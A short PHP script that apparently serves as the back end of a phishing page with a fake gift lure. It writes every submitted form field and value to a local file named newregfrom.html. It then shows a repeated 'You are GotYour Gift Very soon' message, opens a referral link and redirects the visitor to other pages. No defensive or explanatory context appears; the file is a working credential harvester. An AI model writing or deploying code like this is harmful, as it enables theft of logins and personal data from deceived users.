<?php
header ('Location: guddumodok.wixsite.com/guddumodok');
$handle = fopen("newregfrom.html", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
echo "<body><h1>You are GotYour Gift Very soon</h1><br>
<h1>You are GotYour Gift Very soon</h1><br>
<h1>You are GotYour Gift Very soon</h1><br>
<h1>You are GotYour Gift Very soon</h1><br>
<h1>You are GotYour Gift Very soon</h1><br>
<h1>You are GotYour Gift Very soon</h1><br>
<h1>You are GotYour Gift Very soon</h1><br>
 <img src='loading.gif' height='1000'width='1000'><FONT COLOR='BLUE'><h1></BODY>";
echo "<html><head><script>

    window.open('http://join-shortest.com/ref/f2f71d3cd5?user-type=new')</script></head><body>";
    echo "<script type='text/javascript'>location.href = 'index.html';</script>";
        exit;
?>